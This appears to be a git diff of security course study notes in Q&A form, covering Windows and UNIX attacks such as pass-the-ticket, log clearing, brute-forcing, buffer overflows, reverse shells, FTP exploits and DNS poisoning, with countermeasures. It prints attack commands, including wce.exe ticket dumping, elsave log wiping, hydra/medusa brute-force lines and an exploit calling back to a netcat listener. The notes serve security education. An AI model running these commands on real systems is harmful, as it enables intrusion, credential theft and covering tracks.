+- &#128163; `Pass the Ticket for Kerberos`: When using Kerberos authentication, clients authenticate to remote services on remote systems using “tickets” and create new tickets using the **Ticket Granting Ticket (TGT)** provided by the Key Distribution Center (KDC), which is part of the domain controller, on logon. 
 
-  Similar to how pass-the-hash attacks allow an attacker to replay 
-  NTLM password hashes to authenticate on a remote system, an attacker 
-  can perform a "Pass the Ticket" attack: 
-  They can dump existing Kerberos tickets from the 
-  memory of a compromised system using tools like the **Windows Credential Editor** (`wce.exe -K`).
-  The stolen ticket is replayed to authenticate to additional services.
+  Similar to how pass-the-hash attacks allow an attacker to replay NTLM password hashes to authenticate on a remote system, an attacker can perform a "Pass the Ticket" attack: They can dump existing Kerberos tickets from the memory of a compromised system using tools like the **Windows Credential Editor** (`wce.exe -K`). The stolen ticket is replayed to authenticate to additional services.
 
-  &#9940; ` Countermeasures`: For mitigating Kerberos sniffing attacks, 
-  there is no single Registry value to set as with LM.
+  &#9940; ` Countermeasures`: For mitigating Kerberos sniffing attacks, there is no single Registry value to set as with LM.
 
 ### Q: Explain what steps attacker should take to cover his tracks after successfully gaining administrator privileges on Windows system in order to avoid detection. Attackers can hide their files in the system? (Covering Tracks)
 
@@ -454,8 +357,9 @@ A: Once intruders have successfully gained high-level privileges on a Windows sy
 - **Clearing the Event Log**: Intruders may **clear the logs** that show evidence of their activities, such as successful privilege escalation or suspicious network traffic. Event Viewer on the attacker’s host can open, read and clear the remote host’s logs. This process clears the log of all records but it does leave one new record stating that the Event Log has been cleared by the attacker (can raise alarms among system users).
 
   - &#128295; ` ELSave utility`: it is a simple tool for clearing the Event Log.
+    
     Syntax to clear the Security Log on the remote server ‘joel’:
-    ```sh
+    ``` sh
     elsave -s \\joel -l “Security” -C
     ```
 
@@ -464,7 +368,8 @@ A: Once intruders have successfully gained high-level privileges on a Windows sy
   - &#128295; `attrib`: Hiding files gets no simpler than copying files to a directory and using the old *DOS attrib tool* to hide it:
     - `attrib +h [directory]`: hides files and directories from command-line tools, but not if the ‘*Show All Files*’ is selected in Windows.
   - &#128295; ` ADS (Alternate Data Streams)`: NTFS (**New Technology File System**) is a file system developed by Microsoft that supports advanced features like security, compression, and Alternate Data Streams. If the target systems runs it, an alternate file-hiding technique is available to intruders. 
-    NTFS offers support for multiple streams of information within a file (a mechanism to add additional attributes or information to a file without restructuring the file system). It’s also used to hide a malicious hacker’s toolkit (called adminkit). Any file could be used.
+  
+    NTFS offers support for multiple streams of information within a file (a mechanism to add additional attributes or information to a file without restructuring the file system). It’s also used to hide a malicious hacker’s toolkit (called **adminkit**). Any file could be used.
 
 - **Rootkits**: A rootkit is a **collection of computer software, typically malicious**, designed to enable access to a computer or an area of its software that is not otherwise allowed (for example, to an unauthorized user) and often masks its existence or the existence of other software.
 
@@ -475,37 +380,36 @@ A: Windows provides many security tools and features:
 
 -  **Security Center**: Windows Security Center is a consolidated viewing and configuration point for key system security features: Windows Firewall, Windows Update, Antivirus (if installed), and Internet Options.
 
-- **BitLocker & Encrypting File System (EFS)**: **EFS** is a public key-based cryptographic system used to encrypt files on a local system. It ensures that files remain protected from unauthorized access, with encryption done in real-time. It encrypts a file using a random key that is itself encrypted with a user’s public key.
-EFS does not apply to multiple users on the same machine who want to protect files from the other files, in this case we need the ACLs of NTFS. 
+- **BitLocker & Encrypting File System (EFS)**: **EFS** is a public key-based cryptographic system used to encrypt files on a local system. It ensures that files remain protected from unauthorized access, with encryption done in real-time. It encrypts a file using a random key that is itself encrypted with a user’s public key. EFS does not apply to multiple users on the same machine who want to protect files from the other files, in this case we need the ACLs of NTFS. 
 
   The **main vulnerability of EFS lies in the recovery agent account**. The password for the local administrator can be easily reset using tools that they work when the system is started with a different operating system (ex. `chntpw`).
   
-  **BitLocker Drive Encryption** (from Vista onwards) instead, initially meant to provide security on the integrity of the OS, now it serves to protect against attacks like the technique previously mentioned for EFS. BDE **encrypts entire volumes of memory** and saves the key in multiple ways, difficult to compromise since changing OS  doesn't help. But also BDE is **vulnerable to cold boot attacks**, which consist in cooling the DRAM to increase the time before the OS loaded in memory is cleaned of DRAM, and get a system image from which the BDE encryption key could be extracted.
+  **BitLocker Drive Encryption** (from Vista onwards) instead, initially meant to provide security on the integrity of the OS, now it serves to protect against attacks like the technique previously mentioned for EFS. BDE **encrypts entire volumes of memory** and saves the key in multiple ways, difficult to compromise since changing OS doesn't help. But also BDE is **vulnerable to cold boot attacks**, which consist in cooling the DRAM to increase the time before the OS loaded in memory is cleaned of DRAM, and get a system image from which the BDE encryption key could be extracted.
 
-  &#9940; ` Countermeasures`: It is impossible to protect keys in scenarios where the attacker physically possesses them. The only possible mitigation is to physically separate the key from the system it must protect. Shutting down the BDE protected system removes the keys from memory making them unreachable to these attacks. It goes without saying that removable external hardware physically containing the key mitigates the attack.
+  &#9940; ` Countermeasures`: It is impossible to protect keys in scenarios where the attacker physically possesses them. The only possible mitigation is to **physically separate the key from the system** it must protect. Shutting down the BDE protected system removes the keys from memory making them unreachable to these attacks. It goes without saying that removable external hardware physically containing the key mitigates the attack.
 
 - **Windows Resource Protection**: Originally called Windows File Protection (WFP), it was later updated to include critical Registry values in addition to system files and renamed **Windows Resource Protection (WRP)**. WRP stores copies of essential system files in `%Windir%\WinSxS\Backup`. Its protection mechanisms rely on Access Control Lists (ACLs), which actively protect system resources.
 
-  With WRP, even administrators cannot change the protected resources by default. Only specific processes can override its protection, including the Windows Update Installer, Service Packs, Hotfixes, and Operating System upgrades, all of which are installed by the TrustedInstaller account.
+  With WRP, even administrators cannot change the protected resources by default. Only specific processes can override its protection, including the *Windows Update Installer*, *Service Packs*, *Hotfixes*, and *Operating System upgrades*, all of which are installed by the TrustedInstaller account.
 
   The **vulnerability of WRP** lies in the fact that administrators can change the ACLs on protected resources, allowing them to access and modify the protected files. Administrators can, therefore, alter the privileges on these resources.
 
   The purpose of WRP is to prevent unauthorized changes to protected resources by third-party installers or malicious software, not to prevent administrators from performing legitimate actions on the system.
 
-- **Integrity Levels, UAC and PMIE**: With Vista, Microsoft implements **Mandatory Integrity Control (MIC)**, an extension of the discretionary access control system, designed to implement a form of mandatory access control (MAC). MIC to work implements 4 principles called **Integrity Levels (IL)** (low, medium, high, system). These levels prevent a process from reading or writing to a resource with a higher integrity level (called "no write up, no read down" based on the Biba Integrity Model) protecting the integrity. This means, for example, that a process with Medium IL cannot modify resources with High IL privileges, and a High IL process cannot access or change System IL resources.
+- **Integrity Levels, UAC and PMIE**: With Vista, Microsoft implements **Mandatory Integrity Control (MIC)**, an extension of the discretionary access control system, designed to implement a form of mandatory access control (MAC). MIC to work implements 4 principles called **Integrity Levels (IL)** (low, medium, high, system). These levels prevent a process from reading or writing to a resource with a higher integrity level (called "no write up, no read down" based on the Biba Integrity Model) protecting the integrity. 
+ 
+  This means, for example, that a process with Medium IL cannot modify resources with High IL privileges, and a High IL process cannot access or change System IL resources. MIC isn’t directly visible, but rather provides the basis for several important security features introduced in Vista and later versions, such as **User Access Control (UAC)** and **Protected Mode Internet Explorer (PMIE)**.
 
-  MIC isn’t directly visible, but rather provides the basis for several important security features introduced in Vista and later versions, such as **User Access Control (UAC)** and **Protected Mode Internet Explorer (PMIE)**.
-
-  - &#128295; ` UAC`: It controls which specific applications can be run with elevated privileges. It works like this: developers embed to applications a manifest to specify if they require higher privileges (in practice it switches to high IL). 
-
-    When an administrator logs in, the system assigns two tokens: a **filtered token** (for regular applications with no elevated privileges) 
-    and a **linked token** (for applications that need higher privileges). 
-    If a non-admin user tries to run a program that needs elevated privileges, they are prompted for administrator credentials.
-    By default, non-admin processes run at a medium IL, but when elevated through UAC, they run at a high IL, giving them access to resources that require those privileges.
+  - &#128295; ` UAC`: It controls which specific applications can be run with elevated privileges. It works like this: 
+	   - Developers embed to applications a manifest to specify if they require higher privileges (in practice it switches to high IL). 
+	   - When an administrator logs in, the system assigns two tokens: a **filtered token** (for regular applications with no elevated privileges) and a **linked token** (for applications that need higher privileges). 
+	   - If a non-admin user tries to run a program that needs elevated privileges, they are prompted for administrator credentials. 
+	   - By default, non-admin processes run at a medium IL, but when elevated through UAC, they run at a high IL, giving them access to resources that require those privileges.
 
   - &#128295; ` PMIE`: Internet Explorer (`iexplore.exe`) runs at low IL by default, being able to write only on the `%USERPROFILE%\AppData\LocalLow` folder and registry key `HKCU\Software\AppDataLow`. This reduces the risk of malware causing damage while the user is browsing, as it can't write to other critical system areas.
 
-- **Data Execution Prevention (DEP)**:  DEP is a security feature designed to protect against attacks like buffer overflows, where malicious code is injected into executable areas of memory (such as the CPU stack or heap). By **marking certain areas of memory as non-executable**, DEP prevents code from running in those areas. This helps stop attacks that rely on injecting malicious code into memory. DEP uses both software and hardware components to enforce these protections, blocking this type of attack.
+- **Data Execution Prevention (DEP)**:  DEP is a security feature designed to protect against attacks like buffer overflows, where malicious code is injected into executable areas of memory (such as the CPU stack or heap).  
+  By **marking certain areas of memory as non-executable**, DEP prevents code from running in those areas. This helps stop attacks that rely on injecting malicious code into memory. DEP uses both software and hardware components to enforce these protections, blocking this type of attack.
 
 ---
 ## Ch. 5: Hacking UNIX
@@ -514,21 +418,24 @@ EFS does not apply to multiple users on the same machine who want to protect fil
 
 A:
 
-- **REMOTE ACCESS**: involves access obtained through the network (e.g., a listening service) or access to another communications channel, such as a dial-in modem attached to a UNIX system. We are limiting our discussion to accessing a UNIX system from the network via TCP/IP.
+- **REMOTE ACCESS**: It involves access obtained through the network (e.g., a listening service) or access to another communications channel, such as a dial-in modem attached to a UNIX system. We are limiting our discussion to accessing a UNIX system from the network via TCP/IP.
 
-  - &#128163; `Brute-force Attacks`: We start off our discussion of UNIX attacks with the most basic form of attack, brute-force password guessing. A brute-force attack is nothing more than **guessing a user ID/password combination** on a service that attempts to authenticate the user before access is granted. Most passwords are guessed via an automated brute-force utility:
-
-    - &#128295; ` THC Hydra`: example with SSH brute-force using two dictionaries (username and password):
-      ```sh
-      hydra -L users.txt -P password.txt 192.168.56.101 ssh  
-      ```
-    - &#128295; ` Medusa`: is intended to be a speedy, massively parallel, modular, login brute-forcer: `medusa -h 192.168.1.100 -U users.txt -P password.txt -M ssh`
-
+  - &#128163; `Brute-force Attacks`:  The most basic form of UNIX attack are **brute-force password guessing**. A brute-force attack is nothing more than **guessing a user ID/password combination** on a service that attempts to authenticate the user before access is granted. 
+   
+	   Most passwords are guessed via an automated brute-force utility:
+	
+	    - &#128295; ` THC Hydra`: example with SSH brute-force using two dictionaries (username and password):
+	      ```sh
+	      hydra -L users.txt -P password.txt 192.168.56.101 ssh  
+	      ```
+	    - &#128295; ` Medusa`: is intended to be a speedy, massively parallel, modular, login brute-forcer: `medusa -h 192.168.1.100 -U users.txt -P password.txt -M ssh`
+	
 		&#9940; ` Countermeasures`: The best defense against brute-force password guessing attempts is to **use strong passwords** that are not easily guessable. A **one-time password mechanism** would be the most desirable. More recent UNIX operating systems include built-in password controls that reduce the reliance on third-party modules.
 
   - **Data-driven Attacks**: A data-driven attack is executed by sending  data to an active service that causes unintended or undesirable results.
 
-    - &#128163; `Buffer Overflow Attacks`: A buffer overflow condition occurs when a user or process attempts to place more data into a buffer (or fixed array) than was previously allocated. This type of behavior is associated with specific C functions such as *strcpy()*, *strcat()*, and *sprintf()*, among others. A buffer overflow condition would normally cause a **segmentation violation** to occur. However, this type of behavior can be exploited to gain access to the target system.
+    - &#128163; `Buffer Overflow Attacks`: A buffer overflow condition occurs when a user or process attempts to place more data into a buffer (or fixed array) than was previously allocated. This type of behavior is associated with specific C functions such as *strcpy()*, *strcat()*, and *sprintf()*, among others. 
+     A buffer overflow condition would normally cause a **segmentation violation** to occur. However, this type of behavior can be exploited to gain access to the target system.
       **Example**: What happens if attackers connect to sendmail daemon and send a block of data consisting of 1000 *'a'* to the VRFY command rather than a short username?
       ```sh
           echo vrfy ‘perl -e ‘print “a” x1000’’ | nc www.example.com 25
@@ -536,7 +443,7 @@ A:
 
       The VRFY buffer is overrun because it was only designed to hold 128 bytes. Could cause a DoS and crash the daemon. However, it is even more dangerous to have the target system execute code of your choosing.
       This is exactly how a successful buffer overflow attack works. Instead of sending 1.000 letter a’s to the VRFY command, the attackers send specific code that overflows the buffer and executes the command `/bin/sh`. When the attack is executed, special assembly code known as the **egg** is sent to the VRFY command as part of the actual string used to overflow the buffer. When the VRFY buffer is overrun, attackers can set the return address of the offending function, which allows them to alter the flow of the program. Instead of the function returning to its proper memory location, the attacker execute the assembly code that was sent as part of the buffer overflow data (`run /bin/sh`).
-  - **I Want My Shell**: We need to describe several techniques used to obtain shell access. The primary goal of any attacker is to **gain command-line** or shell access to the target system (telnet, rlogin, SSH and so on).
+  - **I Want My Shell**: The primary goal of any attacker is to **gain command-line or shell access** to the target system (*telnet, rlogin, SSH* and so on). There are several techniques used to obtain shell access.
 
     - &#128163; `Reverse Telnet and Back Channels`: We define back channel as a mechanism where the communication channel originates from the target system rather than from the attacking system. A few methods can be used to accomplish this task. In the first method, called **Reverse Telnet**, telnet is used to create a back channel from the target system to the attackers system.
 
@@ -559,14 +466,14 @@ A:
 
       &#9940; ` Countermeasures`: The best prevention is to keep your systems secure so a back-channel attack cannot be executed (disabling unnecessary services and applying vendor patches).
 
-- **GAIN ROOT ACCESS**: Thus far, we have covered common remote access techniques. Most attackers strive to gain local access via some remote vulnerability. At the point where attackers have an interactive command shell, they are considered to be local on the system. Although it is possible to gain direct root access via a remote vulnerability, often attackers gain user access first. Thus, attackers **must escalate user privileges to gain root access**, better known as privilege escalation. 
+- **GAIN ROOT ACCESS**: Thus far, we have covered common remote access techniques. Most attackers strive to gain local access via some remote vulnerability. At the point where attackers have an interactive command shell, they are considered to be local on the system. Although it is possible to gain direct root access via a remote vulnerability, often attackers gain user access first. Thus, attackers must **escalate user privileges to gain root access**, better known as **privilege escalation**. 
 
-  - &#128163; `Local Buffer Overflow`: Buffer overflow vulnerabilities allow attackers to execute arbitrary code or commands on a target system. In August 2011, ZadYree released a vulnerability related to a stack-based buffer overflow condition in the RARLAb unrar 3.9.3 archive package, a Linux port of the popular WinRar archive utility. By persuading an unsuspecting user to open a specially crafted rar file, an attacker can trigger a local stack-based buffer overflow and execute arbitrary code on the system in the context of the user running the unrar application. When run, the exploit jumps to a specific address in memory, and `/bin/sh` is executed in the context of the application.
+  - &#128163; `Local Buffer Overflow`: Buffer overflow vulnerabilities allow attackers to execute arbitrary code or commands on a target system. In August 2011, ZadYree released a vulnerability related to a stack-based buffer overflow condition in the `RARLAb unrar 3.9.3` archive package, a Linux port of the popular `WinRar` archive utility. By persuading an unsuspecting user to open a specially crafted `rar` file, an attacker can trigger a local stack-based buffer overflow and execute arbitrary code on the system in the context of the user running the unrar application. When run, the exploit jumps to a specific address in memory, and `/bin/sh` is executed in the context of the application.
 
     &#9940; ` Countermeasures`: The best buffer overflow countermeasure is **secure coding practices** combined with a **non-executable stack**.
   - &#128163; `Symlink`: Many SUID root programs are coded to create working files in `/tmp` or other directories without the slightest bit of sanity checking. A symbolic link is a mechanism where a file is created via the `ln` command. A symbolic link is nothing more than **a file that points to a different file**. Let’s reinforce the point with a specific example. 
    
-	  In 2009, it was discovered a symlink vulnerability in *xscreensaver 5.01* that can be used to view the contents of other files not owned by a user. Xscreensaver reads user configuration options from the `~/.xscreensaver` file. If the `.xscreensaver` file is a symlink to another file, then that other file is parsed and output to the screen when the user runs the xscreensaver program. Because OpenSolaris installs xscreensaver with the **setuid bit set**, the vulnerability allows us to read any file on the file system.
+	  In 2009, it was discovered a symlink vulnerability in `xscreensaver 5.01` that can be used to view the contents of other files not owned by a user. Xscreensaver reads user configuration options from the `~/.xscreensaver` file. If the `.xscreensaver` file is a symlink to another file, then that other file is parsed and output to the screen when the user runs the xscreensaver program. Because OpenSolaris installs xscreensaver with the **setuid bit set**, the vulnerability allows us to read any file on the file system.
   - &#128163; `Race Condition`: Attackers **take advantage of a program** or process **while it is performing a privileged operation**. Typically, this includes timing the attack to abuse the program or process after it enters a privileged mode but before it gives up its privileges. A vulnerability that allows attackers to abuse this window of opportunity is called a race condition.
 
     A race condition or race hazard is the behavior of an electronics, software, or other system where the system’s substantive behavior is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when one or more of the possible behaviors is undesirable. If the attackers successfully manage to compromise the file or process during its privileged state, it is called “winning the race”.
@@ -672,16 +579,16 @@ Telnet on port 80 connects to our nc listener on port 80. Standard output or key
 A: Many SUID root programs are coded to create working files in `/tmp` or other directories without the slightest bit of sanity checking. A symbolic link is a mechanism where a file is created via the `ln` command. A symbolic link is nothing more than **a file that points to a different file**.
 Let’s reinforce the point with a specific example. 
 
-In 2009, it was discovered a symlink vulnerability in *xscreensaver 5.01* that can be used to view the contents of other files not owned by a user. Xscreensaver reads user configuration options from the `~/.xscreensaver` file. If the `.xscreensaver` file is a symlink to another file, then that other file is parsed and output to the screen when the user runs the xscreensaver program. Because OpenSolaris installs xscreensaver with the **setuid bit set**, the vulnerability allows us to read any file on the file system.
+In 2009, it was discovered a symlink vulnerability in `xscreensaver 5.01` that can be used to view the contents of other files not owned by a user. Xscreensaver reads user configuration options from the `~/.xscreensaver` file. If the `.xscreensaver` file is a symlink to another file, then that other file is parsed and output to the screen when the user runs the xscreensaver program. Because OpenSolaris installs xscreensaver with the **setuid bit set**, the vulnerability allows us to read any file on the file system.
 
-&#9940; ` Countermeasures`: Secure coding practices are the best countermeasure available. Unfortunately, many programs are coded without performing sanity checks on existing files. Programmers should check to see if a file exists before trying to create one, by using the `O_EXCL | O_CREAT` flags. When creating temporary files, set the UMASK and then use the *tmpfile()* or *mktemp()* function.
+&#9940; ` Countermeasures`: Secure coding practices are the best countermeasure available. Unfortunately, many programs are coded without performing sanity checks on existing files. Programmers should check to see if a file exists before trying to create one, by using the `O_EXCL | O_CREAT` flags. When creating temporary files, set the UMASK and then use the `tmpfile()` or `mktemp()` function.
 
 ### Q: Briefly describe at least two main services in Unix system that are often remotely attacked. For each of this services, explain how the remote attack occurs and discuss the possible countermeasure.
 
 A: **Main services** (common types of remote attacks):
 
 - &#128163; `FTP`: FTP is often abused to gain access to remote systems or to store illegal files. Many FTP servers allow anonymous access, enabling any user to log into the FTP server without authentication. Thus, attackers can begin to pull down sensitive configuration files such as `/etc/passwd`.
-  FTP servers had their fair share of security problems related to buffer overflow conditions and other insecurities. One of the most recent FTP vulnerabilities has been discovered in **FreeBSD daemons**. The exploit creates a shell on a local port specified by the attacker.
+  FTP servers have long been associated with security problems related to buffer overflow conditions and other insecurities. One of the most recent FTP vulnerabilities has been discovered in **FreeBSD daemons**. The exploit creates a shell on a local port specified by the attacker: 
 
   We first need to create a netcat listener for the exploit to call back to:
 
@@ -694,21 +601,23 @@ A: **Main services** (common types of remote attacks):
   ```sh
   perl roaringbeast.pl 0 ftp ftp 192.168.1.25 443
   ```
-- &#128163; `Sendmail`: Sendmail is a **Mail Transfer Agent (MTA)** that is used on many UNIX systems. Sendmail is one of the most maligned programs in use (used to gain  access to thousands of systems). We can use `VRFY` and `EXPN` commands to identify user accounts.
+- &#128163; `Sendmail`: Sendmail is a **Mail Transfer Agent (MTA)** that is used on many UNIX systems. Sendmail is one of the most maligned programs in use (used to gain access to thousands of systems). We can use `VRFY` and `EXPN` commands to identify user accounts.
   Many vulnerabilities are present related to remote buffer overflow conditions and input validation attacks have been identified.
 
   &#9940; ` Countermeasures`: The best defense for sendmail attacks is to **disable sendmail** if you are not using it to receive mail over a network. If you must run sendmail, ensure that you are **using the latest version** with all relevant security patches. Finally, consider using a more secure MTA such as **qmail** or **postfix**.
-- &#128163; `DNS Cache Poisoning`: Numerous security and availability issues have been associated with `BIND`. The following example highlights one of the latest cache poisoning attacks. This technique is used by hackers to **trick clients into contacting a malicious server instead of the intended system**. That is to say, all  requests are resolved and redirected to a system the hacker owns. 
-
-	> **Note: BIND (Berkeley Internet Name Domain)** is the most widely used DNS server software on the internet.
+- &#128163; `DNS Cache Poisoning`: DNS cache poisoning, also known as DNS spoofing, is an attack where hackers manipulate the DNS cache of a server to **trick clients into contacting a malicious server instead of the intended legitimate system.** This results in all requests being resolved and redirected to a system controlled by the attacker. Numerous security and availability issues have been associated with `BIND` (the most widely used DNS server software on the internet). 
 
 	
-	In 2008, Dan Kaminsky latest cache-poisoning attack against DNS was grabbing headlines.
+	The first step is to enumerate vulnerable servers. Most attackers set up automated tools to identify unpatched and misconfigured DNS servers quickly.
+	In 2008, Dan Kaminsky highlighted a severe DNS cache poisoning vulnerability that made headlines. This attack exposed how DNS systems could be tricked into accepting fraudulent DNS records, allowing attackers to redirect traffic on a massive scale.
+		
 	To check if the DNS has this potential vulnerability perform the following enumeration:
 
   ```sh
   dig @192.168.56.101 version.bind chaos txt
   ```
+
+	This command queries the `version.bind` field in the BIND server's configuration to identify its version and assess whether it may be exposed to known vulnerabilities.
 
   &#9940; ` Countermeasures`: For any system that is not being used as a DNS server, you should **disable and remove BIND**. Ensure the version of BIND you are using is current and patched for related security flaws.
 
